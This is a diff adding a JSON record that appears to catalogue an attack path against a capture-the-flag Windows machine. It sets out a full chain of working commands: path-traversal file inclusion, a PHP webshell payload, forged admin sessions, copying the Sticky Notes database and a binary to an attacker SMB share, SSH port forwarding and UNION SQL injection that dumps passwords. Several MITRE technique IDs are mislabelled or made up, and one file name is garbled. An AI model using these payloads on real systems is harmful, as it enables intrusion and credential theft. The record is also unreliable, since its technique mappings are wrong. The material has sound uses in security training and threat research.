@@ -1,0 +1,158 @@
+```json
+{
+  "id": "ap-0026",
+  "title": "Windows Escalation: LFI, Session Hijacking, RCE, Sticky Notes Credential Theft, and SQL Injection Privilege Escalation",
+  "summary": "Initial access gained via Local File Inclusion (LFI) to leak credentials and secret keys. This allows for session hijacking and remote code execution (RCE) on the web server. Further enumeration reveals user credentials stored in Sticky Notes backup, leading to SSH access. Privilege escalation is achieved by analyzing a proprietary binary and exploiting a local service vulnerability via SQL injection to retrieve the Administrator's password.",
+  "attack_path_markdown": "### Step 1\nPerform comprehensive network scanning and analyze HTTP headers. Discovery of a Local File Inclusion (LFI) vulnerability through path traversal on a web parameter, allowing local file retrieval.\n### Step 2\nUse the LFI vulnerability to read critical PHP source files, extract the JWT secret key, and determine the session cookie generation logic. Craft a PHP webshell payload for RCE.\n### Step 3\nForge administrative credentials using the discovered key and session logic. Use Burp Suite to bypass HTTP redirects and upload the webshell, establishing a beachhead.\n### Step 4\nExploit the webshell to execute OS commands remotely and enumerate local files, discovering initial user credentials stored in application data.\n### Step 5\nEstablish persistence using SSH with the acquired user credentials. Enumerate the file system to locate the Sticky Notes backup database.\n### Step 6\nExfiltrate and analyze the Sticky Notes database to find credentials for a 'development' account. Use this new access to transfer and analyze a suspicious binary, revealing a hidden local port, which is then accessed via SSH local port forwarding.\n### Step 7\nExploit a SQL Injection vulnerability in the hidden service to dump encrypted administrator credentials and the corresponding decryption key. Decrypt the final password and gain full root access.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Initial service enumeration and identification of the Local File Inclusion vector.",
+      "actions": [
+        "Check system status and TTL: `ping <target IP>`.",
+        "Perform TCP port scan for all ports: `sudo nmap -p- -sS -n --min-rate 5000 -v -Pn <target IP> -oG ports`.",
+        "Perform detailed service and version scan: `nmap -sC -sV -p 22,80,135,139,443,445,3306,5985 <target IP> -oN total`.",
+        "Check web technologies: `whatweb web`.",
+        "Enumerate SMB services: `crackmapexec smb <target IP>`.",
+        "Inspect SSL certificate: `openssl s_client -connect <target IP>:443`.",
+        "Directory fuzzing on web application root: `ffuf -ac -w <sec_list_path>/discovery/web-content/directory-list-2.3-medium.txt -mc 200 -u http://<target IP>/FUZZ`.",
+        "Discover LFI vulnerability by trying non-existent book IDs, revealing path errors and file paths: `...book=book_that_does_not_exist.html`.",
+        "Confirm LFI via path traversal: `...book=../../../../../../../../../../../../../../windows/system32/drivers/etc/hosts`."
+      ],
+      "tools": ["nmap", "ffuf", "crackmapexec", "openssl", "whatweb", "ping"],
+      "techniques": ["Scanning (T1046)", "Local File Inclusion (L801)", "Path Traversal"],
+      "mitre_ids": ["T1046", "T1595.001"],
+      "indicators": ["Open ports 22, 80, 443, 445, 3306, 5985", "Error messages exposing PHP code structure"],
+      "preconditions": "Network connectivity to the target machine.",
+      "expected_outcome": "Discovery of LFI vulnerability allowing PHP source code reading.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Acquiring secret keys and session logic to impersonate an administrator.",
+      "actions": [
+        "Read database credentials: `...book=../../../../../../../../../../../../../../xampp/htdocs/db.php`.",
+        "Read file controller code to extract JWT secret key: `...book=../../../../../../../../../../../../../../xampp/htdocs/portal/includes/file_controller.php`.",
+        "Read cookie generation code: `...book=../../../../../../../../../../../../../../xampp/htdocs/portal/cookie.php`.",
+        "Generate potential session cookies for 'paul': `php cookie.php paul` (Run multiple times, sorted for unique values).",
+        "Define PHP webshell payload: `<?php echo shell_exec($_GET['cmd']); ?>`."
+      ],
+      "tools": ["Burp Suite (Repeater)", "php", "Local File Inclusion"],
+      "techniques": ["Steal Credentials (T1003.008)", "Session Manipulation", "Exploit Development (T1587.001)"],
+      "mitre_ids": ["T1003.008", "T1587.001"],
+      "indicators": ["MySQL credentials ('brett' and password)", "JWT Secret Key ('secret_key')", "Computed session cookies for 'paul'"],
+      "preconditions": "Verified LFI capability and retrieved secret key.",
+      "expected_outcome": "Ability to forge 'paul' (admin) session cookies and JWT.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Impersonating the administrator to upload the webshell.",
+      "actions": [
+        "Configure Burp Suite Match/Replace (Response Header): Replace `302 Found` with `200 OK` to defeat HTTP redirection.",
+        "Replace `phpcsessid` and `jwtoken` with forged values for user 'paul'.",
+        "Initiate file upload of webshell (`cmd.php`) via file management interface."
+      ],
+      "tools": ["Burp Suite (Match and Replace)", "Web Browser"],
+      "techniques": ["Impersonation (T1078.003)", "File Upload Attack (T1609)"],
+      "mitre_ids": ["T1078.003", "T1609"],
+      "indicators": ["Successful authentication as 'paul'", "Upload success message."],
+      "preconditions": "Forged administrative session credentials.",
+      "expected_outcome": "Webshell uploaded and accessible on the server.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Executing remote commands and acquiring initial user credentials.",
+      "actions": [
+        "Intercept upload request and bypass extension filter by changing parameter value: Change `task=<filename>.zip` to `task=cmd.php`.",
+        "Execute commands via webshell: `curl http://<target IP>/portal/blogs/cmd.php?cmd=whoami`.",
+        "Enumerate user data directory: `dir user_data`.",
+        "Retrieve 'juliette' credentials from application file: `type user_data/juliette.json`."
+      ],
+      "tools": ["Burp Suite (Proxy)", "curl"],
+      "techniques": ["Remote Code Execution (T1210)", "Exploitation of Web Vulnerabilities (T1190)", "Credential Dumping (T1003)"],
+      "mitre_ids": ["T1210", "T1190", "T1003"],
+      "indicators": ["Webshell output (command results)", "Discovery of 'juliette' credentials."],
+      "preconditions": "Successful webshell upload and path knowledge.",
+      "expected_outcome": "Acquisition of 'juliette' user credentials.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establishing a stable connection and enumerating local files for privilege escalation vectors.",
+      "actions": [
+        "Validate 'juliette' credentials: `crackmapexec smb <target IP> -u juliette -p <password>`.",
+        "Connect via SSH: `ssh juliette@<target IP>`.",
+        "Retrieve user flag: `type user.txt`.",
+        "Enumerate local directories for Sticky Notes backup location: `cd C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\`.",
+        "Setup attacker SMB server for file transfer: `smbserver.py smb_folder .`.",
+        "Transfer Sticky Notes database: `copy plum.sqlite 4.096 \\10.10.14.29\smb_folder`."
+      ],
+      "tools": ["crackmapexec", "ssh", "smbserver.py", "copy"],
+      "techniques": ["Remote Access Software (T1021.004)", "Credentials in Files (T1552.001)", "System Information Discovery (T1082)"],
+      "mitre_ids": ["T1021.004", "T1552.001", "T1082"],
+      "indicators": ["Successful SSH session as 'juliette'", "Transfer of Sticky Notes database file (`plum.sqlite 4.096`)."],
+      "preconditions": "Valid SSH credentials for 'juliette'.",
+      "expected_outcome": "Local persistence and acquisition of the Sticky Notes database.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Extracting higher-value credentials and setting up access to an internal service.",
+      "actions": [
+        "Extract credentials from SQLite file: `strings plum.sqlite 4.096` (Discovers 'development' account).",
+        "Connect via SSH with new credentials: `ssh development@<target IP>`.",
+        "Locate and transfer proprietary binary: `copy crypt3r_linux \\10.10.14.29\smb_folder` (or use `scp`).",
+        "Analyze binary strings for clues: `strings crypt3r_linux` (Reveals port 1234 and URL structure).",
+        "Check listening ports on the target machine: `netstat -nat`.",
+        "Establish local port forwarding: `ssh -L 1234:localhost:1234 development@<target IP>`."
+      ],
+      "tools": ["strings", "ssh", "netstat", "scp", "smbserver.py"],
+      "techniques": ["Data from Local System (T1005)", "Application Access via Proxy (T1021.001)", "Discovery (T1049)"],
+      "mitre_ids": ["T1005", "T1021.001", "T1049"],
+      "indicators": ["Discovery of 'development' user credentials.", "Local port 1234 exposed via port forwarding."],
+      "preconditions": "Access to the 'development' account and the proprietary binary.",
+      "expected_outcome": "Access to the internal web service running on port 1234.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Exploiting the hidden service via SQL injection to gain administrator privileges.",
+      "actions": [
+        "Test access via forwarded port: `curl http://localhost:1234/index.php`.",
+        "SQL Injection to find database name: `...m=union+select+database()`.",
+        "SQL Injection to find table name: `...m=union+select+table_name+from+information_schema.tables+where+table_schema='brett'`.",
+        "SQL Injection to find column names: `...m=union+select+column_name+from+information_schema.columns+where+table_schema='brett'+and+table_name='passwords'`.",
+        "SQL Injection to dump data (Account, Password, Key): `...m=union+select+group_concat(account,0x3a,password,0x3a,key)+from+brett.passwords`.",
+        "Decrypt Base64/AES password using CyberChef (AES Decrypt, Key: extracted key, IV: 16 null bytes).",
+        "Final connection as Administrator: `ssh Administrator@<target IP>`.",
+        "Retrieve root flag: `type root.txt`."
+      ],
+      "tools": ["curl", "CyberChef (AES Decrypt)"],
+      "techniques": ["SQL Injection (T1506)", "Decryption (T1003.003)", "OS Credential Guard Bypass"],
+      "mitre_ids": ["T1506", "T1003.003", "T1546"],
+      "indicators": ["Cleartext Administrator password.", "Root access achieved."],
+      "preconditions": "Access to the hidden web service and successful data dumping.",
+      "expected_outcome": "Administrative control of the target machine.",
+      "confidence": 1.0
+    }
+  ],
+  "tactics": ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Credential Access", "Discovery", "Lateral Movement", "Command and Control", "Exfiltration", "Impact"],
+  "techniques": ["Local File Inclusion", "Session Tampering", "Remote Code Execution", "SQL Injection", "SSH Access", "Sticky Notes Abuse", "Port Forwarding"],
+  "mitre_ids": ["T1078.003", "T1190", "T1210", "T1021.004", "T1506", "T1552.001", "T1003.003"],
+  "hosts": ["10.10.10.228"],
+  "privs_obtained": ["domain user (juliette, development)", "Administrator"],
+  "confidence": 0.95,
+  "source_file": "",
+  "notes": "Procedure involves multiple escalation stages, leveraging web vulnerabilities for credential exposure and system binaries for lateral movement clues.",
+  "labels": ["attack_path", "windows", "web_app", "lfi", "sql_injection", "privesc"]
+}
+```
